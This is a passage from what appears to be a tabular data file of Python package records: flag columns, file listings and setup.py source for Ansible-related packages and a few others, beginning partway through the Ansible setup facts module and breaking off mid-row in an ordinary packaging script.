              File/results format can be JSON or INI-format. The default C(fact_path) can be
              specified in C(ansible.cfg) for when setup is automatically called as part of
              C(gather_facts).
              NOTE - For windows clients, the results will be added to a variable named after the
              local file (without extension suffix), rather than C(ansible_local).
            - Since Ansible 2.1, Windows hosts can use C(fact_path). Make sure that this path
              exists on the target host. Files in this path MUST be PowerShell scripts C(.ps1)
              which outputs an object. This object will be formatted by Ansible as json so the
              script should be outputting a raw hashtable, array, or other primitive object.
        type: path
        default: /etc/ansible/facts.d
description:
    - This module is automatically called by playbooks to gather useful
      variables about remote hosts that can be used in playbooks. It can also be
      executed directly by C(/usr/bin/ansible) to check what variables are
      available to a host. Ansible provides many I(facts) about the system,
      automatically.
    - This module is also supported for Windows targets.
extends_documentation_fragment:
  -  action_common_attributes
  -  action_common_attributes.facts
attributes:
    check_mode:
        support: full
    diff_mode:
        support: none
    facts:
        support: full
    platform:
        platforms: posix, windows
notes:
    - More ansible facts will be added with successive releases. If I(facter) or
      I(ohai) are installed, variables from these programs will also be snapshotted
      into the JSON file for usage in templating. These variables are prefixed
      with C(facter_) and C(ohai_) so it's easy to tell their source. All variables are
      bubbled up to the caller. Using the ansible facts and choosing to not
      install I(facter) and I(ohai) means you can avoid Ruby-dependencies on your
      remote systems. (See also M(community.general.facter) and M(community.general.ohai).)
    - The filter option filters only the first level subkey below ansible_facts.
    - If the target host is Windows, you will not currently have the ability to use
      C(filter) as this is provided by a simpler implementation of the module.
    - This module should be run with elevated privileges on BSD systems to gather facts like ansible_product_version.
    - For more information about delegated facts,
      please check U(https://docs.ansible.com/ansible/latest/user_guide/playbooks_delegation.html#delegating-facts).
author:
    - ""Ansible Core Team""
    - ""Michael DeHaan""
'''

EXAMPLES = """"""
# Display facts from all hosts and store them indexed by I(hostname) at C(/tmp/facts).
# ansible all -m ansible.builtin.setup --tree /tmp/facts

# Display only facts regarding memory found by ansible on all hosts and output them.
# ansible all -m ansible.builtin.setup -a 'filter=ansible_*_mb'

# Display only facts returned by facter.
# ansible all -m ansible.builtin.setup -a 'filter=facter_*'

# Collect only facts returned by facter.
# ansible all -m ansible.builtin.setup -a 'gather_subset=!all,facter'

- name: Collect only facts returned by facter
  ansible.builtin.setup:
    gather_subset:
      - '!all'
      - '!<any valid subset>'
      - facter

- name: Collect only selected facts
  ansible.builtin.setup:
    filter:
      - 'ansible_distribution'
      - 'ansible_machine_id'
      - 'ansible_*_mb'

# Display only facts about certain interfaces.
# ansible all -m ansible.builtin.setup -a 'filter=ansible_eth[0-2]'

# Restrict additional gathered facts to network and virtual (includes default minimum facts)
# ansible all -m ansible.builtin.setup -a 'gather_subset=network,virtual'

# Collect only network and virtual (excludes default minimum facts)
# ansible all -m ansible.builtin.setup -a 'gather_subset=!all,network,virtual'

# Do not call puppet facter or ohai even if present.
# ansible all -m ansible.builtin.setup -a 'gather_subset=!facter,!ohai'

# Only collect the default minimum amount of facts:
# ansible all -m ansible.builtin.setup -a 'gather_subset=!all'

# Collect no facts, even the default minimum subset of facts:
# ansible all -m ansible.builtin.setup -a 'gather_subset=!all,!min'

# Display facts from Windows hosts with custom facts stored in C(C:\\custom_facts).
# ansible windows -m ansible.builtin.setup -a ""fact_path='c:\\custom_facts'""

# Gathers facts for the machines in the dbservers group (a.k.a Delegating facts)
- hosts: app_servers
  tasks:
    - name: Gather facts from db servers
      ansible.builtin.setup:
      delegate_to: ""{{ item }}""
      delegate_facts: true
      loop: ""{{ groups['dbservers'] }}""
""""""

# import module snippets
from ..module_utils.basic import AnsibleModule

from ansible.module_utils._text import to_text
from ansible.module_utils.facts import ansible_collector, default_collectors
from ansible.module_utils.facts.collector import CollectorNotFoundError, CycleFoundInFactDeps, UnresolvedFactDep
from ansible.module_utils.facts.namespace import PrefixFactNamespace


def main():
    module = AnsibleModule(
        argument_spec=dict(
            gather_subset=dict(default=[""all""], required=False, type='list', elements='str'),
            gather_timeout=dict(default=10, required=False, type='int'),
            filter=dict(default=[], required=False, type='list', elements='str'),
            fact_path=dict(default='/etc/ansible/facts.d', required=False, type='path'),
        ),
        supports_check_mode=True,
    )

    gather_subset = module.params['gather_subset']
    gather_timeout = module.params['gather_timeout']
    filter_spec = module.params['filter']

    # TODO: this mimics existing behavior where gather_subset=[""!all""] actually means
    #       to collect nothing except for the below list
    # TODO: decide what '!all' means, I lean towards making it mean none, but likely needs
    #       some tweaking on how gather_subset operations are performed
    minimal_gather_subset = frozenset(['apparmor', 'caps', 'cmdline', 'date_time',
                                       'distribution', 'dns', 'env', 'fips', 'local',
                                       'lsb', 'pkg_mgr', 'platform', 'python', 'selinux',
                                       'service_mgr', 'ssh_pub_keys', 'user'])

    all_collector_classes = default_collectors.collectors

    # rename namespace_name to root_key?
    namespace = PrefixFactNamespace(namespace_name='ansible',
                                    prefix='ansible_')

    try:
        fact_collector = ansible_collector.get_ansible_collector(all_collector_classes=all_collector_classes,
                                                                 namespace=namespace,
                                                                 filter_spec=filter_spec,
                                                                 gather_subset=gather_subset,
                                                                 gather_timeout=gather_timeout,
                                                                 minimal_gather_subset=minimal_gather_subset)
    except (TypeError, CollectorNotFoundError, CycleFoundInFactDeps, UnresolvedFactDep) as e:
        # bad subset given, collector, idk, deps declared but not found
        module.fail_json(msg=to_text(e))

    facts_dict = fact_collector.collect(module=module)

    module.exit_json(ansible_facts=facts_dict)


if __name__ == '__main__':
    main()
",1
ansible-lint-6.4.0,0,1,1,1,0,0,0,0,.ansible-lint ansible-lint.spec dictionary.txt .coveragerc .darglint .flake8 .gitattributes CODEOWNERS CODE_OF_CONDUCT.md CONTRIBUTING.md dependabot.yml bug_report.md config.yml ISSUE_TEMPLATE.md release-drafter.yml SECURITY.md ack.yml push.yml release.yml tox.yml .gitignore .git_archival.txt .isort.cfg .packit.yaml .pre-commit-config.yaml .pre-commit-hooks.yaml .prettierignore .prettierrc .pylintrc .readthedocs.yml extensions.json .yamllint codecov.yml conftest.py COPYING cspell.config.yaml DCO_1_1.md .gitignore .nojekyll conf.py configuring.md contributing.md custom-rules.md default_rules.md index.md installing.md LICENSE.mit.txt philosophy.md .gitignore profiles.md README.md rules.md rules_table_generator_ext.py usage.md ansible-lint.svg logo_invert.png theme_overrides.css ansible-lint.yml ansible-navigator.yml .ansible-lint ansible-navigator.yml encoding.j2 runtime.yml execution-environment.yml execution-environment.yml galaxy.yml all.yml localhost.yml broken_dev_inventory.yml inventory.yml production.yml lineno.yml runtime.yml some.j2.yaml some.yaml-too always-run-success.yml become-user-without-become-failure.yml become-user-without-become-success.yml become.transformed.yml become.yml block.yml blockincludes.yml blockincludes2.yml bracketsmatchtest.yml command-check-failure.yml command-check-success.yml common-include-1.yml common-include-2.yml conflicting_action.yml contains_secrets.transformed.yml contains_secrets.yml custom_module.yml ematcher-rule.yml empty_playbook.yml example.yml extra_vars.yml included-handlers.yml y.yml include-import-tasks-in-role.yml include-in-block.yml include.yml jinja2-when-failure.yml jinja2-when-success.yml json-schema-fail.yml lots_of_warnings.transformed.yml lots_of_warnings.yml mocked_dependency.yml multiline-brackets-do-not-match-test.yml multiline-bracketsmatchtest.yml no-prompting.yml nomatches.yml nomatchestest.transformed.yml nomatchestest.yml noqa-nested.yml noqa.yml norole.yml norole2.yml package-check-failure.yml package-check-success.yml pass-loop-var-prefix.yml play.yml playbook-imported.yml playbook-parent.yml README.md rule-no-tabs.yml rule-only-builtins.yml schema-error-string.yml skiptasks.yml syntax-error-string.yml syntax-error.yml task-has-name-failure.yml task-has-name-success.yml taskimports.yml taskincludes.yml main.yml empty_blocks.yml include-in-block-inner.yml included-with-lint.yml nestedincludes.yml passing_task.yml simple_task.yml varset.yml varunset.yml x.yml not-valid.yaml unicode.transformed.yml unicode.yml using-bare-variables-failure.yml using-bare-variables-success.yml valid_with_alt_extension.yaml var-spacing.yml empty_vars.transformed.yml empty_vars.yml invalid_vars_schema.yml not_decryptable.yml other.yml strings.transformed.yml strings.yml settings.yml var-spacing.yml with-skip-tag-id.yml with-umlaut-_.yml requirements.yml requirements.yml main.yaml main.yml argument_specs.yml main.yml main.yml argument_specs.yml main.yml main.yaml main.yml main.yaml main.yml requirements.yml invalud_meta_schema fail.yml pass.yml main.yml main.yml fail.yml pass.yml main.yml imported_tasks.yml included_tasks.yml main.yml a_file main.yml main.yml requirements.yml include-import-role.yml main.yml world.yml main.yml main.yml main.yaml task_has_tag.py playbook.yml main.yml invalid.yml valid.yml mypy.ini PKG-INFO playbook.yml fake_module.py pyproject.toml pytest.ini README.md requirements.txt requirements.yml setup.cfg app.py cli.py color.py config.py constants.py profiles.yml errors.py file_utils.py __init__.py generate_docs.py loaders.py logger.py py.typed command_instead_of_module.py command_instead_of_shell.py __init__.py deprecated_bare_vars.md deprecated_bare_vars.py deprecated_command_syntax.py deprecated_local_action.py deprecated_module.py empty_string_compare.py fqcn_builtins.py git_latest.py hg_latest.py ignore_errors.py inline_env_var.py key_order.py literal_compare.py meta_incorrect.py meta_no_info.py meta_no_tags.py meta_video_links.py no_changed_when.py no_handler.py no_jinja_nesting.py no_jinja_when.py no_log_password.py no_loop_var_prefix.py no_prompting.py no_relative_paths.py no_same_owner.py no_tabs.py only_builtins.py package_latest.py partial_become.py playbook_extension.py risky_file_permissions.py risky_octal.py risky_shell_pipe.py role_name.py schema.py syntax_check.py unnamed_task.py var_naming.py var_spacing.md var_spacing.py yaml.md yaml.py __init__.py runner.py ansible-lint-config.json ansible-navigator-config.json arg_specs.json execution-environment.json galaxy.json inventory.json meta-runtime.json meta.json playbook.json requirements.json tasks.json vars.json __init__.py skip_utils.py fixtures.py __init__.py text.py transformer.py utils.py version.py yaml_utils.py rules.py __init__.py _mockings.py _version.py __init__.py __main__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt bar.txt conftest.py example_com_rule.py __init__.py custom_rule.py __init__.py __init__.py ansible-config-invalid.yml ansible-config.yml config-with-extra-vars.yml config-with-relative-path.yml config-with-write-all.yml config-with-write-none.yml config-with-write-subset.yml exclude-paths-with-expands.yml exclude-paths.yml fmt-1.yml fmt-2.yml fmt-3.yml fmt-1.yml fmt-2.yml fmt-3.yml fmt-1.yml fmt-2.yml fmt-3.yml .yamllint parseable.yml quiet.yml rulesdir-defaults.yml rulesdir.yml show-abspath.yml show-relpath.yml skip-tags.yml tags.yml test_regenerate_formatting_fixtures.py unknown-type.yml .yamllint verbosity.yml __init__.py foo.txt galaxy. README.md test-collection.yml test_module_1_failed.py main.yml main.yml b_failed.py test_module_3_failed.py main.yml test.yml test_module_1_f main.yml main.yml b_failed_c test_module_3_f main.yml test_module_1_success.p main.yml main.yml b_success.py test_module_3_success.p main.yml ematcher.py raw_task.py unset_variable_matcher.py __init__.py test_deprecated_module.py test_inline_env_var.py test_line_too_long.py test_literal_compare.py test_meta_change_from_default.py test_meta_no_info.py test_meta_video_links.py test_nested_jinja_rule.py test_no_changed_when.py test_no_jinja_when.py test_no_relative_paths.py test_octal_permissions.py test_package_latest.py test_risky_shell_pipe.py test_role_names.py test_unnamed_task.py test_use_bare_variables.py test_use_handler_rather_than_when_changed.py __init__.py test_ansiblelintrule.py test_ansiblesyntax.py test_boot.py test_cli_role_paths.py test_commandline_invocations_same_as_config.py test_dependencies_in_meta.py test_eco.py test_examples.py test_file_path_evaluation.py test_file_utils.py test_formatter.py test_formatter_base.py test_formatter_json.py test_formatter_sarif.py test_import_include_role.py test_import_playbook.py test_import_with_malformed.py test_include_miss_file_with_role.py test_lint_rule.py test_list_rules.py test_load_failure.py test_local_content.py test_main.py test_matcherrror.py test_profiles.py test_rules_collection.py test_rule_properties.py test_runner.py test_skiputils.py test_skip_import_playbook.py test_skip_inside_yaml.py test_skip_playbook_items.py test_task_includes.py test_transformer.py test_transform_mixin.py test_utils.py test_verbosity.py test_with_skip_tagid.py test_yaml_utils.py __init__.py get-version.sh test-setup.sh update-version.sh tox.ini,,1
ansible-modules-hashivault-4.7.0,0,1,1,1,1,0,0,0,hashivault_approle_role.py hashivault_approle_role_get.py hashivault_approle_role_id.py hashivault_approle_role_list.py hashivault_approle_role_secret.py hashivault_approle_role_secret_accessor_ hashivault_approle_role_secret_get.py hashivault_approle_role_secret_list.py hashivault_audit.py hashivault_audit_list.py hashivault_auth_ldap.py hashivault_auth_list.py hashivault_auth_method.py hashivault_aws_auth_config.py hashivault_aws_auth_role.py hashivault_azure_auth_config.py hashivault_azure_auth_role.py hashivault_azure_secret_engine_config.py hashivault_azure_secret_engine_role.py hashivault_cluster_status.py hashivault_consul_secret_engine_config.p hashivault_consul_secret_engine_role.py hashivault_db_secret_engine_config.py hashivault_db_secret_engine_role.py hashivault_delete.py hashivault_generate_root.py hashivault_generate_root_cancel.py hashivault_generate_root_init.py hashivault_generate_root_status.py hashivault_identity_entity.py hashivault_identity_entity_alias.py hashivault_identity_group.py hashivault_identity_group_alias.py hashivault_init.py hashivault_k8s_auth_config.py hashivault_k8s_auth_role.py hashivault_ldap_group.py hashivault_leader.py hashivault_list.py hashivault_namespace.py hashivault_oidc_auth_method_config.py hashivault_oidc_auth_role.py hashivault_pki_ca.py hashivault_pki_ca_set.py hashivault_pki_cert_get.py hashivault_pki_cert_issue.py hashivault_pki_cert_list.py hashivault_pki_cert_revoke.py hashivault_pki_cert_sign.py hashivault_pki_crl.py hashivault_pki_crl_get.py hashivault_pki_crl_rotate.py hashivault_pki_role.py hashivault_pki_role_get.py hashivault_pki_role_list.py hashivault_pki_set_signed.py hashivault_pki_tidy.py hashivault_pki_url.py hashivault_pki_url_get.py hashivault_policy.py hashivault_policy_get.py hashivault_policy_list.py hashivault_read.py hashivault_read_to_file.py hashivault_rekey.py hashivault_rekey_cancel.py hashivault_rekey_init.py hashivault_rekey_status.py hashivault_rekey_verify.py hashivault_seal.py hashivault_secret.py hashivault_secret_engine.py hashivault_secret_list.py hashivault_ssh_role.py hashivault_ssh_role_list.py hashivault_status.py hashivault_token_create.py hashivault_token_lookup.py hashivault_token_renew.py hashivault_token_revoke.py hashivault_token_role.py hashivault_token_role_list.py hashivault_unseal.py hashivault_userpass.py hashivault_write.py hashivault_write_from_file.py _hashivault_approle_role_create.py _hashivault_approle_role_secret_create.p _hashivault_approle_role_secret_delete.p _hashivault_audit_enable.py _hashivault_auth_enable.py _hashivault_aws_ec2_role_create.py _hashivault_mount_tune.py _hashivault_policy_delete.py _hashivault_policy_set.py _hashivault_policy_set_from_file.py _hashivault_secret_disable.py _hashivault_secret_enable.py _hashivault_userpass_create.py _hashivault_userpass_delete.py __init__.py hashivault.py hashivault_read_to_file.py hashivault_write_from_file.py hashivault.py hashivault.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt AUTHORS CHANGELOG.rst LICENSE MANIFEST.in PKG-INFO README.rst setup.cfg setup.py,"#!/usr/bin/env python
from setuptools import setup

py_files = [
    ""ansible/module_utils/hashivault"",
    ""ansible/plugins/lookup/hashivault"",
    ""ansible/plugins/action/hashivault_read_to_file"",
    ""ansible/plugins/action/hashivault_write_from_file"",
    ""ansible/plugins/doc_fragments/hashivault"",
]
files = [
    ""ansible/modules/hashivault"",
]

long_description = open('README.rst', 'r').read()

setup(
    name='ansible-modules-hashivault',
    version='4.7.0',
    description='Ansible Modules for Hashicorp Vault',
    long_description=long_description,
    long_description_content_type='text/x-rst',
    author='Terry Howe',
    author_email='terrylhowe@example.com',
    url='https://github.com/TerryHowe/ansible-modules-hashivault',
    py_modules=py_files,
    packages=files,
    install_requires=[
        'ansible>=4.0.0',
        'hvac>=0.11.2',
        'requests',
    ],
)
",1
ansible-runner-2.2.1,0,1,1,1,0,0,0,0,.cherry_picker.toml .coveragerc .dockerignore CODE_OF_CONDUCT.md issue_labeler.yml bug_report.yml config.yml documentation_report.yml feature_request.yml patchback.yml pr_labeler_existing.yml pr_labeler_new.yml ci.yml triage_existing.yml triage_new.yml .pre-commit-config.yaml .readthedocs.yaml .yamllint jobs.yaml .zuul.ignore pre.yaml project.yaml cleanup.py ansible_cfg.py command.py doc.py inventory.py runner.py _base.py __init__.py defaults.py awx_display.py __init__.py __init__.py exceptions.py interface.py loader.py output.py __init__.py runner.py runner_config.py streaming.py base64io.py capacity.py streaming.py __init__.py __init__.py __main__.py dependency_links.txt entry_points.txt not-zip-safe pbr.json PKG-INFO requires.txt SOURCES.txt top_level.txt AUTHORS bindep.txt ChangeLog CODEOWNERS CONTRIBUTING.md envvars extravars passwords settings ssh_key hosts main.yml main.yml main.yml README.md main.yml inventory test.yml main.yml test.yml Dockerfile ansible_runner.config.rst ansible_runner.display_callback.rst ansible_runner.rst conf.py container.rst execution_environments.rst external_interface.rst index.rst install.rst intro.rst make.bat Makefile modules.rst python_interface.rst remote_jobs.rst requirements.in requirements.txt standalone.rst LICENSE.md Makefile MANIFEST.in changelog compat control copyright docker-compose.yml Dockerfile pydist-overrides rules format ansible-runner.spec.j2 docker-compose.yml Dockerfile.epel-7-x86_64 Dockerfile.epel-8-x86_64 PKG-INFO pytest.ini README.md requirements.txt SECURITY.md setup.cfg setup.py conftest.py envvars hosts use_role.yml envvars settings hosts test-container.yml envvars inv_1 inv_2 debug.yml main.yml settings main.yml test_ee.py envvars inventory gen_host_status.yml envvars settings hosts printenv.yml argument_specs. envvars hosts look_at_environment.py get_environment.yml envvars hosts sleep.yml envvars hosts .galaxy_inst main.yml main.yml use_role.yml other_callback.py conftest.py test_cleanup_images.py test_cli_containerized.py test_container_management.py Containerfile demo.yml inventory.ini test_config.py test_display_callback.py test_events.py test_interface.py test_main.py test_runner.py test_transmit_worker_process.py test___main__.py requirements.txt test_ansible_cfg.py test_command.py test_container_volmount_generation.py test_doc.py test_inventory.py test_runner.py test__base.py __init__.py conftest.py test_cleanup.py test_event_filter.py test_interface.py test_loader.py test_runner.py test_uuid.py __init__.py test_cleanup_folder.py test_dump_artifacts.py test_fifo_pipe.py test_utils.py __init__.py __init__.py test_worker.py __init__.py common.py __init__.py bindep.txt build-requirements.txt requirements-stable-2.10.txt requirements-stable-2.11.txt requirements-stable-2.12.txt requirements-stable-2.9.txt requirements.txt test-setup.sh upper-constraints-stable-2.10.txt upper-constraints-stable-2.11.txt upper-constraints-stable-2.12.txt upper-constraints-stable-2.9.txt tox.ini entrypoint.sh,"#!/usr/bin/env python

from setuptools import setup

setup(
    setup_requires=['pbr'],
    pbr=True,
)
",1
ansible-tower-cli-3.3.9,1,1,1,1,1,0,0,0,dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt Makefile README.md conf.rst exceptions.rst generate_tables.py index.rst ad_hoc.rst application.rst credential.rst credential_type.rst group.rst host.rst instance.rst instance_group.rst inventory.rst inventory_script.rst inventory_source.rst inventory_update.rst job.rst job_template.rst label.rst node.rst notification_template.rst organization.rst project.rst project_update.rst role.rst schedule.rst setting.rst team.rst user.rst workflow.rst workflow_job.rst schema_a.yml schema_b.yml schema_simple.yml schema_tiny.yml fake_data_creator.sh inventory_script_example.py README.rst teardown_script.sh variables.yml workflow_demo.sh index.rst CONFIG_CMD_OPTIONS.rst NOTIFICATION_TEMPLATE_MANAGEMENT.rst ROLE_MANAGEMENT.rst SURVEYS.rst VERSIONING.rst WORKFLOWS.rst conf.py CONTRIBUTING.rst HISTORY.rst index.rst install.rst quickstart.rst layout.html LICENSE MANIFEST.in PKG-INFO README.rst requirements.txt setup.cfg setup.py compat.py requirements.txt runtests.py test_api.py test_cli_action.py test_cli_misc.py test_cli_resource.py test_cli_transfer_common.py test_cli_transfer_logging_command.py test_cli_types.py test_conf.py test_exceptions.py test_models_base.py test_models_fields.py test_models_unified_jobs.py test_resources_ad_hoc.py test_resources_credential.py test_resources_group.py test_resources_host.py test_resources_inventory.py test_resources_inventory_source.py test_resources_job.py test_resources_job_template.py test_resources_label.py test_resources_notification_template.py test_resources_project.py test_resources_role.py test_resources_schedule.py test_resources_setting.py test_resources_workflow.py test_resources_workflow_job.py test_utils.py test_utils_datastructures.py test_utils_debug.py test_utils_parser.py test__init.py __init__.py api.py action.py base.py misc.py resource.py run.py cleaner.py common.py logging_command.py receive.py send.py __init__.py types.py __init__.py compat.py conf.py constants.py exceptions.py base.py fields.py __init__.py activity_stream.py ad_hoc.py application.py credential.py credential_type.py group.py host.py instance.py instance_group.py inventory.py inventory_script.py inventory_source.py inventory_update.py job.py job_event.py job_template.py label.py node.py notification_template.py organization.py project.py project_update.py role.py schedule.py setting.py team.py token.py unified_job.py user.py workflow.py workflow_job.py __init__.py data_structures.py debug.py exceptions.py grammar.py parser.py resource_decorators.py __init__.py __init__.py tox.ini,"#!/usr/bin/env python
# Copyright 2013-2015, Ansible, Inc.
# Michael DeHaan <michael@ansible.com>
# Luke Sneeringer <lsneeringer@ansible.com>
# and others
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import re
import os
import sys
import codecs
from distutils.core import setup
from setuptools import find_packages
from setuptools.command.test import test as TestCommand


pkg_name = 'tower_cli'
dashed_name = pkg_name.replace('_', '-')
awx_entry = dashed_name.replace('tower', 'awx')


# Avoid packaging any other API version of tower-cli with current one
# Note: The 0,1 in the format strings are for building el6 rpms with python 2.6.6
exclude_list = ['tests']
primary_install = len(pkg_name.split('_')) == 2
base_name = pkg_name[:9]
if not primary_install:
    exclude_list += [base_name, '{0}.*'.format(base_name)]
for v in (1, 2):
    if pkg_name.endswith(str(v)):
        continue
    v_name = '{0}_v{1}'.format(base_name, v)
    exclude_list += [v_name, '{0}.*'.format(v_name)]
discovered_packages = find_packages(exclude=exclude_list)


class Tox(TestCommand):
    """"""The test command should install and then run tox.

    Based on http://tox.readthedocs.org/en/latest/example/basic.html
    """"""
    user_options = [('tox-args=', 'a', ""Arguments to pass to tox"")]

    def initialize_options(self):
        TestCommand.initialize_options(self)
        self.tox_args = """"

    def finalize_options(self):
        TestCommand.finalize_options(self)
        self.test_args = []
        self.test_suite = True

    def run_tests(self):
        import tox  # Import here, because outside eggs aren't loaded.
        import shlex
        sys.exit(tox.cmdline(args=shlex.split(self.tox_args)))


def parse_requirements(filename):
    """"""Parse out a list of requirements from the given requirements
    requirements file.
    """"""
    reqs = []
    version_spec_in_play = None

    # Iterate over each line in the requirements file.
    for line in open(filename, 'r').read().strip().split('\n'):
        # Sanity check: Is this an empty line?
        # If so, do nothing.
        if not line.strip():
            continue

        # If this is just a plain requirement (not a comment), then
        # add it to the requirements list.
        if not line.startswith('#'):
            reqs.append(line)
            continue

        # ""Header"" comments take the form of ""=== Python {op} {version} ==="",
        # and make the requirement only matter for those versions.
        # If this line is a header comment, parse it.
        match = re.search(r'^# === [Pp]ython (?P<op>[<>=]{1,2}) '
                          r'(?P<major>[\d])\.(?P<minor>[\d]+) ===[\s]*$', line)
        if match:
            version_spec_in_play = match.groupdict()
            for key in ('major', 'minor'):
                version_spec_in_play[key] = int(version_spec_in_play[key])
            continue

        # If this is a comment that otherwise looks like a package, then it
        # should be a package applying only to the current version spec.
        #
        # We can identify something that looks like a package by a lack
        # of any spaces.
        if ' ' not in line[1:].strip() and version_spec_in_play:
            package = line[1:].strip()

            # Sanity check: Is our version of Python one of the ones currently
            # in play?
            op = version_spec_in_play['op']
            vspec = (version_spec_in_play['major'],
                     version_spec_in_play['minor'])
            if '=' in op and sys.version_info[0:2] == vspec:
                reqs.append(package)
            elif '>' in op and sys.version_info[0:2] > vspec:
                reqs.append(package)
            elif '<' in op and sys.version_info[0:2] < vspec:
                reqs.append(package)

    # Okay, we should have an entire list of requirements now.
    return reqs


def combine_files(*args):
    """"""returns a string of all the strings in *args combined together,
    with two line breaks between them""""""
    file_contents = []
    for filename in args:
        with codecs.open(filename, mode='r', encoding='utf8') as f:
            file_contents.append(f.read())
    return ""\n\n"".join(file_contents)


# Read the constants, for versioning information
constants = {}
exec(
    open(os.path.join(pkg_name, 'constants.py')).read(),
    constants
)


setup(
    # Basic metadata
    name='ansible-%s' % dashed_name,
    version=constants['VERSION'],
    author='Red Hat, Inc.',
    author_email='info@ansible.com',
    url='https://github.com/ansible/tower-cli',

    # Additional information
    description='A CLI tool for Ansible Tower and AWX.',
    long_description=combine_files(
        'README.rst',
        os.path.join('docs', 'source', 'HISTORY.rst')
    ),
    license='Apache 2.0',

    # How to do the install
    install_requires=parse_requirements('requirements.txt'),
    provides=[
        pkg_name,
    ],
    entry_points={
        'console_scripts': [
            '%s=%s.cli.run:cli' % (dashed_name, pkg_name),
            '%s=%s.cli.run:cli' % (awx_entry, pkg_name),
        ],
    },
    packages=discovered_packages,
    include_package_data=True,
    # How to do the tests
    tests_require=['tox'],
    cmdclass={'test': Tox},

    # PyPI metadata.
    classifiers=[
        'Development Status :: 5 - Production/Stable',
        'Environment :: Console',
        'Intended Audience :: Developers',
        'Intended Audience :: System Administrators',
        'License :: OSI Approved :: Apache Software License',
        'Operating System :: MacOS :: MacOS X',
        'Operating System :: POSIX :: Linux',
        'Programming Language :: Python',
        'Programming Language :: Python :: 2.7',
        'Programming Language :: Python :: 3.4',
        'Programming Language :: Python :: 3.5',
        'Programming Language :: Python :: 3.6',
        'Topic :: System :: Software Distribution',
        'Topic :: System :: Systems Administration',
    ],
    zip_safe=False
)
",1
ansicolors-1.1.8,0,1,1,1,0,0,1,0,.coveragerc dependency_links.txt not-zip-safe PKG-INFO SOURCES.txt top_level.txt CHANGES.yml colors.py csscolors.py version.py __init__.py LICENSE MANIFEST.in PKG-INFO pytest.ini README.rst setup.cfg setup.py show_colors.py test.py tox.ini toxcov.ini,,1
ansicon-1.89.0,0,1,1,1,1,0,0,0,ANSI32.dll ANSI64.dll __init__.py dependency_links.txt not-zip-safe PKG-INFO SOURCES.txt top_level.txt LICENSE MANIFEST.in PKG-INFO README.rst setup.cfg setup.py test_ansicon.py test_ansicon.pyc __init__.py __init__.pyc test_ansicon.cpython-37.pyc __init__.cpython-37.pyc,"#!/usr/bin/env python
# Copyright 2017 Avram Lubkin, All Rights Reserved

# This Source Code Form is subject to the terms of the Mozilla Public
# License, v. 2.0. If a copy of the MPL was not distributed with this
# file, You can obtain one at http://mozilla.org/MPL/2.0/.

""""""
A Python wrapper for loading Jason Hood's ANSICON

ANSICON can be found at https://github.com/adoxa/ansicon
""""""

import io

from setuptools import setup


def readme(filename, encoding='utf8'):
    """"""
    Read the contents of a file
    """"""

    with io.open(filename, encoding=encoding) as source:
        return source.read()


setup(
    name='ansicon',
    version='1.89.0',
    description=""Python wrapper for loading Jason Hood's ANSICON"",
    long_description=readme('README.rst'),
    author='Avram Lubkin',
    author_email='avylove@rockhopper.net',
    maintainer='Avram Lubkin',
    maintainer_email='avylove@rockhopper.net',
    url='https://github.com/Rockhopper-Technologies/ansicon',
    license='MPLv2.0',
    zip_safe=False,
    install_requires=[],
    tests_require=[],
    packages=['ansicon'],
    package_data={'ansicon': ['*.dll']},
    test_suite='tests',

    classifiers=[
        'Development Status :: 5 - Production/Stable',
        'Environment :: Console',
        'Intended Audience :: Developers',
        'License :: OSI Approved :: Mozilla Public License 2.0 (MPL 2.0)',
        'Operating System :: Microsoft :: Windows',
        'Programming Language :: Python',
        'Programming Language :: Python :: 2.7',
        'Programming Language :: Python :: 3.4',
        'Programming Language :: Python :: 3.5',
        'Programming Language :: Python :: 3.6',
        'Programming Language :: Python :: 3.7',
        'Programming Language :: Python :: Implementation :: CPython',
        'Programming Language :: Python :: Implementation :: PyPy',
        'Topic :: Utilities',
    ],
    keywords='ansicon terminal console',
)
",1
ansiwrap-0.8.4,0,1,1,1,1,0,1,0,.travis.yml ansistate.py core.py __init__.py dependency_links.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt AUTHORS CHANGES.yml demo.py LICENSE.txt MANIFEST.in PKG-INFO pytest.ini README README.rst setup.cfg setup.py test_ansiwrap.py tox.ini,,1
antchain_alipay_util-1.0.2,0,1,1,1,1,0,1,0,antchain_utils.py __init__.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt PKG-INFO README.md setup.cfg setup.py,"
 Licensed to the Apache Software Foundation (ASF) under one
 or more contributor license agreements.  See the NOTICE file
 distributed with this work for additional information
 regarding copyright ownership.  The ASF licenses this file
 to you under the Apache License, Version 2.0 (the
 ""License""); you may not use this file except in compliance
 with the License.  You may obtain a copy of the License at
     http://www.apache.org/licenses/LICENSE-2.0
 Unless required by applicable law or agreed to in writing,
 software distributed under the License is distributed on an
 ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
 KIND, either express or implied.  See the License for the
 specific language governing permissions and limitations
 under the License.
'''

import os
from setuptools import setup, find_packages

""""""
Setup module for antchain_alipay_util.
Created on 06/09/2020
@author: Ant Chain SDK
""""""

PACKAGE = ""antchain_alipay_util""
DESCRIPTION = ""The antchain alipay util module of alibabaCloud Python SDK.""
AUTHOR = ""Ant Chain SDK""
AUTHOR_EMAIL = ""sdk-team@alibabacloud.com""
URL = ""https://github.com/alipay/antchain-openapi-util-sdk""
TOPDIR = os.path.dirname(__file__) or "".""
VERSION = __import__(PACKAGE).__version__

with open(""README.md"", encoding=""utf-8"") as fp:
    LONG_DESCRIPTION = fp.read()

setup_args = {
    'version': VERSION,
    'description': DESCRIPTION,
    'long_description': LONG_DESCRIPTION,
    'author': AUTHOR,
    'author_email': AUTHOR_EMAIL,
    'license': ""Apache License 2.0"",
    'url': URL,
    'keywords': ['antchain_alipay_util'],
    'packages': find_packages(exclude=[""tests*""]),
    'platforms': 'any',
    'install_requires': [],
    'classifiers': (
